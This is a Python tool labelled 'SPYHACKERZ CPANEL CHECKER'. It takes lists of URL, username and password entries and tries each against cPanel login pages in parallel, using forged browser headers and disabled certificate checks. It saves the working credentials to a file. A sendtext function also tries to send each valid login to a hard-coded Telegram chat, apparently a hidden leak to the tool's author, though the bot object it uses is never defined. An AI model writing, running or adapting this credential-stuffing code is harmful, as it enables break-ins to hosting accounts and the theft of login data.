
import sys, requests, re, datetime
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def sendtext(text):
    try:
        bot.sendMessage(-3131314, text)
    except:
        pass


print("  \n\n                      {}SPYHACKERZ CPANEL CHECKER\n                      \n              {}your list should save with encoding:Utf-8\n    {}if u don't how how to save just copy your list into list.txt\n                     \n                        {}by @yabgufatihsah \n                   {} https://spyhackerz.org".format(fg, fg, fg, fr, fg))

def check(txt):
    url = txt.split('|')[0]
    login = txt.split('|')[1]
    password = txt.split('|')[2]
    headers = {
      'Accept': '*/*',
      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
      'Connection': 'keep-alive',
      'Origin': url,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'}
    params = {'login_only': '1'}
    data = {'user':login, 
     'pass':password}
    try:
        try:
            response = requests.post(('{}/login/'.format(url)), params=params, headers=headers, data=data, timeout=20, verify=False).json()
            if response['status'] == 1:
                print('Valid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
                with open('good.txt', 'a') as f:
                    print(url + ' --> {}[Success]'.format(fg))
                    f.write('{}|{}|{} \n'.format(url, login, password))
                    sendtext(url + '|' + login + '|' + password)
            else:
                print('Invalid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
                print(url + ' --> {}[Failed]'.format(fr))
        except:
            print(url + ' --> {}[Failed]'.format(fr))

    except requests.Timeout as err:
        try:
            print(url + ' --> {}[Failed]'.format(fr))
        finally:
            err = None
            del err


def Main():
    file = input('your list >>> : ')
    accounts_list = open(file, 'r').read().splitlines()
    thread = int(input('threads >>> : '))
    mp = Pool(thread)
    mp.map(check, accounts_list)
    mp.close()
    mp.join()


Main()
